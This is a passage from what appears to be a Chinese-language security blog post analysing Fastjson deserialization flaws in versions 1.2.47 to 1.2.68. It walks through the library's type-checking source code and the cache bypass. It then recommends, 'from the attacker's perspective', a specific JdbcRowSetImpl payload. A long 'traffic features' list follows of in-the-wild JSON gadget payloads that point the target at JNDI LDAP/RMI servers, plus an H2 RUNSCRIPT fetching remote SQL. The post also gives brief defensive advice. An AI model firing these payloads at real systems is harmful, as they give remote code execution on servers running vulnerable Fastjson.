</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=n>Arrays</span><span class=o>.</span><span class=na>binarySearch</span><span class=o>(</span><span class=n>denyHashCodes</span><span class=o>,</span> <span class=n>hash</span><span class=o>)</span> <span class=o>&gt;=</span> <span class=n>0</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;autoType is not support. &#34;</span> <span class=o>+</span> <span class=n>typeName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=n>Arrays</span><span class=o>.</span><span class=na>binarySearch</span><span class=o>(</span><span class=n>acceptHashCodes</span><span class=o>,</span> <span class=n>hash</span><span class=o>)</span> <span class=o>&gt;=</span> <span class=n>0</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=o>(</span><span class=n>clazz</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=n>clazz</span> <span class=o>=</span> <span class=n>TypeUtils</span><span class=o>.</span><span class=na>loadClass</span><span class=o>(</span><span class=n>typeName</span><span class=o>,</span> <span class=n>defaultClassLoader</span><span class=o>,</span> <span class=kc>false</span><span class=o>);</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=o>(</span><span class=n>expectClass</span> <span class=o>!=</span> <span class=kc>null</span> <span class=o>&amp;&amp;</span> <span class=n>expectClass</span><span class=o>.</span><span class=na>isAssignableFrom</span><span class=o>(</span><span class=n>clazz</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;type not match. &#34;</span> <span class=o>+</span> <span class=n>typeName</span> <span class=o>+</span> <span class=s>&#34; -&gt; &#34;</span> <span class=o>+</span> <span class=n>expectClass</span><span class=o>.</span><span class=na>getName</span><span class=o>());</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>clazz</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>clazz</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>clazz</span> <span class=o>=</span> <span class=n>TypeUtils</span><span class=o>.</span><span class=na>loadClass</span><span class=o>(</span><span class=n>typeName</span><span class=o>,</span> <span class=n>defaultClassLoader</span><span class=o>,</span> <span class=kc>false</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>clazz</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>TypeUtils</span><span class=o>.</span><span class=na>getAnnotation</span><span class=o>(</span><span class=n>clazz</span><span class=o>,</span><span class=n>JSONType</span><span class=o>.</span><span class=na>class</span><span class=o>)</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>clazz</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>ClassLoader</span><span class=o>.</span><span class=na>class</span><span class=o>.</span><span class=na>isAssignableFrom</span><span class=o>(</span><span class=n>clazz</span><span class=o>)</span> <span class=c1>// classloader is danger
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=o>||</span> <span class=n>DataSource</span><span class=o>.</span><span class=na>class</span><span class=o>.</span><span class=na>isAssignableFrom</span><span class=o>(</span><span class=n>clazz</span><span class=o>)</span> <span class=c1>// dataSource can load jdbc driver
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;autoType is not support. &#34;</span> <span class=o>+</span> <span class=n>typeName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>expectClass</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=n>expectClass</span><span class=o>.</span><span class=na>isAssignableFrom</span><span class=o>(</span><span class=n>clazz</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>clazz</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;type not match. &#34;</span> <span class=o>+</span> <span class=n>typeName</span> <span class=o>+</span> <span class=s>&#34; -&gt; &#34;</span> <span class=o>+</span> <span class=n>expectClass</span><span class=o>.</span><span class=na>getName</span><span class=o>());</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>JavaBeanInfo</span> <span class=n>beanInfo</span> <span class=o>=</span> <span class=n>JavaBeanInfo</span><span class=o>.</span><span class=na>build</span><span class=o>(</span><span class=n>clazz</span><span class=o>,</span> <span class=n>clazz</span><span class=o>,</span> <span class=n>propertyNamingStrategy</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>beanInfo</span><span class=o>.</span><span class=na>creatorConstructor</span> <span class=o>!=</span> <span class=kc>null</span> <span class=o>&amp;&amp;</span> <span class=n>autoTypeSupport</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;autoType is not support. &#34;</span> <span class=o>+</span> <span class=n>typeName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>final</span> <span class=kt>int</span> <span class=n>mask</span> <span class=o>=</span> <span class=n>Feature</span><span class=o>.</span><span class=na>SupportAutoType</span><span class=o>.</span><span class=na>mask</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>boolean</span> <span class=n>autoTypeSupport</span> <span class=o>=</span> <span class=k>this</span><span class=o>.</span><span class=na>autoTypeSupport</span>
</span></span><span class=line><span class=cl>            <span class=o>||</span> <span class=o>(</span><span class=n>features</span> <span class=o>&amp;</span> <span class=n>mask</span><span class=o>)</span> <span class=o>!=</span> <span class=n>0</span>
</span></span><span class=line><span class=cl>            <span class=o>||</span> <span class=o>(</span><span class=n>JSON</span><span class=o>.</span><span class=na>DEFAULT_PARSER_FEATURE</span> <span class=o>&amp;</span> <span class=n>mask</span><span class=o>)</span> <span class=o>!=</span> <span class=n>0</span><span class=o>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(!</span><span class=n>autoTypeSupport</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;autoType is not support. &#34;</span> <span class=o>+</span> <span class=n>typeName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>clazz</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>由于autoType没开启，所以不会进入 <code>if (autoTypeSupport || expectClass != null)</code> 分支进行白加黑的判断。紧接着，进入如下分支，从缓存中拿Class：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span><span class=n>clazz</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>clazz</span> <span class=o>=</span> <span class=n>TypeUtils</span><span class=o>.</span><span class=na>getClassFromMapping</span><span class=o>(</span><span class=n>typeName</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>最后从这个分支返回Class（从如下代码中看出，不能存在expectClass）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span><span class=n>clazz</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>expectClass</span> <span class=o>!=</span> <span class=kc>null</span>
</span></span><span class=line><span class=cl>            <span class=o>&amp;&amp;</span> <span class=n>clazz</span> <span class=o>!=</span> <span class=n>java</span><span class=o>.</span><span class=na>util</span><span class=o>.</span><span class=na>HashMap</span><span class=o>.</span><span class=na>class</span>
</span></span><span class=line><span class=cl>            <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=n>expectClass</span><span class=o>.</span><span class=na>isAssignableFrom</span><span class=o>(</span><span class=n>clazz</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;type not match. &#34;</span> <span class=o>+</span> <span class=n>typeName</span> <span class=o>+</span> <span class=s>&#34; -&gt; &#34;</span> <span class=o>+</span> <span class=n>expectClass</span><span class=o>.</span><span class=na>getName</span><span class=o>());</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>clazz</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>总结下利用方式：</p><ul><li>第一步，先想办法将 <code>JdbcRowSetImpl</code> 加入缓存；</li><li>第二步，在未开启autoType的情况下，直接从缓存中拿取 <code>JdbcRowSetImpl</code> ，不用经过白加黑的验证;</li></ul><p>而payload中，第一个@type的反序列化，将使用 <code>MiscCodec</code> 反序列化器，最终在如下位置加载var对应的Class（在 <code>TypeUtils.loadClass</code> 中会将加载后的Class放入缓存）：</p><p><img src=/media/image-20210805152928005.png alt=image-20210805152928005></p><p>后续进行第二个@type的反序列化时，将直接从缓存中拿Class，不经过白加黑检测：</p><p><img src=/media/image-20210805153540117.png alt=image-20210805153540117></p><h3 id=1248--version--1268>1.2.48 &lt;= Version &lt;= 1.2.68</h3><p>在1.2.48中，对1.2.47进行了修复，使用 <code>MiscCodec</code> 反序列化器调用 <code>TypeUtils.loadClass</code> 加载类时，将cache设置为false，这样就不会将加载的恶意类放入缓存了：</p><p><img src=/media/image-20210805154206390.png alt=image-20210805154206390></p><p>然后这个版本区间内的payload主要又是一些黑名单绕过以及补丁中的黑名单新增。</p><h3 id=version-1268>Version 1.2.68</h3><p>1.2.68版本引入了safemode（默认关闭），打开safemode后，@type就不起作用了。所以也就没法绕了。开启safeMode的方法如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>ParserConfig</span><span class=o>.</span><span class=na>getGlobalInstance</span><span class=o>().</span><span class=na>setSafeMode</span><span class=o>(</span><span class=kc>true</span><span class=o>);</span>
</span></span></code></pre></td></tr></table></div></div><p>到了这个版本，基本上已知的 <code>JNDI gadget</code> 都已经进了黑名单，还不允许反序列化类实现了 ClassLoader、DataSource、RowSet 接口，这就导致了绝大部分的 <code>JNDI gadget</code> 无法利用。</p><p>不过还是有一些偏门的Gadget可以JNDI，需要开启autoType（感觉除了hadoop外，都有点偏门）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&#34;</span><span class=p>,</span><span class=nt>&#34;metricRegistry&#34;</span><span class=p>:</span><span class=s2>&#34;ldap://localhost:1389/Exploit&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&#34;</span><span class=p>,</span><span class=nt>&#34;healthCheckRegistry&#34;</span><span class=p>:</span><span class=s2>&#34;ldap://localhost:1389/Exploit&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory&#34;</span><span class=p>,</span> <span class=nt>&#34;tmJndiName&#34;</span><span class=p>:</span> <span class=s2>&#34;ldap://localhost:1389/Exploit&#34;</span><span class=p>,</span> <span class=nt>&#34;tmFromJndi&#34;</span><span class=p>:</span> <span class=kc>true</span><span class=p>,</span> <span class=nt>&#34;transactionManager&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;$ref&#34;</span><span class=p>:</span><span class=s2>&#34;$.transactionManager&#34;</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&#34;</span><span class=p>,</span> <span class=nt>&#34;tmJndiName&#34;</span><span class=p>:</span> <span class=s2>&#34;ldap://localhost:1389/Exploit&#34;</span><span class=p>,</span> <span class=nt>&#34;tmFromJndi&#34;</span><span class=p>:</span> <span class=kc>true</span><span class=p>,</span> <span class=nt>&#34;transactionManager&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;$ref&#34;</span><span class=p>:</span><span class=s2>&#34;$.transactionManager&#34;</span><span class=p>}}</span>
</span></span></code></pre></td></tr></table></div></div><p>然后这篇文章提出一种写文件的Gadget（无具体Payload）：</p><p><a href=https://cloud.tencent.com/developer/article/1642365>https://cloud.tencent.com/developer/article/1642365</a></p><p>可以抛砖引玉学习下。</p><h2 id=总结-1>总结</h2><p>站在攻击者角度，碰到Fastjson可以按照如下思路进行攻击：</p><p>优先使用如下Payload进行攻击，因为这个Payload在1.2.48之前，无需开启autoType即可攻击（准确点应该是不能开启autoType）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;test1&#34;</span><span class=p>:{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;java.lang.Class&#34;</span><span class=p>,</span><span class=nt>&#34;val&#34;</span><span class=p>:</span><span class=s2>&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class=p>},</span><span class=nt>&#34;test2&#34;</span><span class=p>:{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class=p>,</span><span class=nt>&#34;dataSourceName&#34;</span><span class=p>:</span><span class=s2>&#34;ldap://localhost:1389/Object&#34;</span><span class=p>,</span><span class=nt>&#34;autoCommit&#34;</span><span class=p>:</span><span class=kc>true</span><span class=p>}}</span>
</span></span></code></pre></td></tr></table></div></div><p>对于如果上述Payload攻击不成功，则基本上判断靶机为1.2.48版本以上的了，那么就把已知的常用的Payload都打一遍叭（ <code>JdbcRowSetImpl</code> 和 <code>TemplatesImpl</code> 就不用试了&mldr;早就黑名单里了 ）~</p><p>站在防御者角度，项目内存在Fastjson，如何防御？</p><p>最好还是换了叭&mldr;&mldr;不要用Fastjson了&mldr;&mldr;</p><p>换不了的话。如果不需要用@type特性，就直接升级新版本开启safeMode，不要开启autoType。或者项目内不要使用 <code>JSON.parse(String)</code> ，统一使用 <code>JSON.parseObject(String, Class)</code> 也可以防御（前面分析过原因，在返回Class之前，会进行类型比较，不通过直接抛出异常）。</p><h2 id=流量特征>流量特征</h2><p>先汇总下目前在野的Payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=c1>// 低版本常用Payload
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span><span class=nt>&#34;test&#34;</span><span class=p>:{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class=p>,</span><span class=nt>&#34;dataSourceName&#34;</span><span class=p>:</span><span class=s2>&#34;ldap://localhost:8080/Shell&#34;</span><span class=p>,</span><span class=nt>&#34;autoCommit&#34;</span><span class=p>:</span><span class=kc>true</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;test&#34;</span><span class=p>:{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;org.springframework.beans.factory.config.PropertyPathFactoryBean&#34;</span><span class=p>,</span><span class=nt>&#34;targetBeanName&#34;</span><span class=p>:</span><span class=s2>&#34;ldap://localhost:1389/test&#34;</span><span class=p>,</span><span class=nt>&#34;propertyPath&#34;</span><span class=p>:</span><span class=s2>&#34;foo&#34;</span><span class=p>,</span><span class=nt>&#34;beanFactory&#34;</span><span class=p>:{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;org.springframework.jndi.support.SimpleJndiBeanFactory&#34;</span><span class=p>,</span><span class=nt>&#34;shareableResources&#34;</span><span class=p>:[</span><span class=s2>&#34;ldap://localhost:1389/test&#34;</span><span class=p>]}}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;rand1&#34;</span><span class=p>:</span><span class=err>Set</span><span class=p>[{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&#34;</span><span class=p>,</span><span class=nt>&#34;beanFactory&#34;</span><span class=p>:{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;org.springframework.jndi.support.SimpleJndiBeanFactory&#34;</span><span class=p>,</span><span class=nt>&#34;shareableResources&#34;</span><span class=p>:[</span><span class=s2>&#34;ldap://localhost:1389/test&#34;</span><span class=p>]},</span><span class=nt>&#34;adviceBeanName&#34;</span><span class=p>:</span><span class=s2>&#34;ldap://localhost:1389/test&#34;</span><span class=p>},{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&#34;</span><span class=p>}]}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;test&#34;</span><span class=p>:{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class=p>,</span><span class=nt>&#34;_bytecodes&#34;</span><span class=p>:[</span><span class=s2>&#34;Your Eval Class Bytecodes&#34;</span><span class=p>],</span><span class=nt>&#34;_name&#34;</span><span class=p>:</span><span class=s2>&#34;p1n93r&#34;</span><span class=p>,</span><span class=nt>&#34;_tfactory&#34;</span><span class=p>:{},</span><span class=nt>&#34;_outputProperties&#34;</span><span class=p>:{}}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;rand1&#34;</span><span class=p>:{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;com.mchange.v2.c3p0.JndiRefForwardingDataSource&#34;</span><span class=p>,</span><span class=nt>&#34;jndiName&#34;</span><span class=p>:</span><span class=s2>&#34;ldap://localhost:1389/test&#34;</span><span class=p>,</span><span class=nt>&#34;loginTimeout&#34;</span><span class=p>:</span><span class=mi>0</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 高版本常用Payload
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span><span class=nt>&#34;test1&#34;</span><span class=p>:{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;java.lang.Class&#34;</span><span class=p>,</span><span class=nt>&#34;val&#34;</span><span class=p>:</span><span class=s2>&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class=p>},</span><span class=nt>&#34;test2&#34;</span><span class=p>:{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class=p>,</span><span class=nt>&#34;dataSourceName&#34;</span><span class=p>:</span><span class=s2>&#34;ldap://localhost:1389/Object&#34;</span><span class=p>,</span><span class=nt>&#34;autoCommit&#34;</span><span class=p>:</span><span class=kc>true</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;test&#34;</span><span class=p>:{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;org.apache.commons.configuration.JNDIConfiguration&#34;</span><span class=p>,</span><span class=nt>&#34;prefix&#34;</span><span class=p>:</span><span class=s2>&#34;ldap://127.0.0.1:1072/Shell&#34;</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;test&#34;</span><span class=p>:{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;ch.qos.logback.core.db.DriverManagerConnectionSource&#34;</span><span class=p>,</span><span class=nt>&#34;url&#34;</span><span class=p>:</span><span class=s2>&#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://127.0.0.1:8080/inject.sql&#39;&#34;</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;test&#34;</span><span class=p>:{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;org.apache.xbean.propertyeditor.JndiConverter&#34;</span><span class=p>,</span><span class=nt>&#34;AsText&#34;</span><span class=p>:</span><span class=s2>&#34;ldap://localhost:1389/test&#34;</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;test&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;org.apache.shiro.realm.jndi.JndiRealmFactory&#34;</span><span class=p>,</span> <span class=nt>&#34;jndiNames&#34;</span><span class=p>:[</span><span class=s2>&#34;ldap://localhost:1389/test&#34;</span><span class=p>],</span> <span class=nt>&#34;Realms&#34;</span><span class=p>:[</span><span class=s2>&#34;&#34;</span><span class=p>]}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;test&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;br.com.anteros.dbcp.AnterosDBCPConfig&#34;</span><span class=p>,</span><span class=nt>&#34;metricRegistry&#34;</span><span class=p>:</span><span class=s2>&#34;ldap://localhost:1389/test&#34;</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;test&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&#34;</span><span class=p>,</span><span class=nt>&#34;properties&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;java.util.Properties&#34;</span><span class=p>,</span><span class=nt>&#34;UserTransaction&#34;</span><span class=p>:</span><span class=s2>&#34;ldap://localhost:1389/test&#34;</span><span class=p>}}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;test&#34;</span><span class=p>:{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&#34;</span><span class=p>,</span><span class=nt>&#34;properties&#34;</span><span class=p>:{</span><span class=nt>&#34;data_source&#34;</span><span class=p>:</span><span class=s2>&#34;ldap://localhost:1389/test&#34;</span><span class=p>}}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;test&#34;</span><span class=p>:{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&#34;</span><span class=p>,</span><span class=nt>&#34;properties&#34;</span><span class=p>:{</span><span class=nt>&#34;data_source&#34;</span><span class=p>:</span><span class=s2>&#34;ldap://localhost:1389/test&#34;</span><span class=p>}}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;oracle.jdbc.connector.OracleManagedConnectionFactory&#34;</span><span class=p>,</span><span class=nt>&#34;xaDataSourceName&#34;</span><span class=p>:</span><span class=s2>&#34;ldap://127.0.0.1:1072/Exploit1&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;org.apache.commons.configuration2.JNDIConfiguration&#34;</span><span class=p>,</span><span class=nt>&#34;prefix&#34;</span><span class=p>:</span><span class=s2>&#34;rmi://127.0.0.1:1072/Exploit1&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 以下Payload比较偏门
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&#34;</span><span class=p>,</span><span class=nt>&#34;metricRegistry&#34;</span><span class=p>:</span><span class=s2>&#34;ldap://localhost:1389/Exploit&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
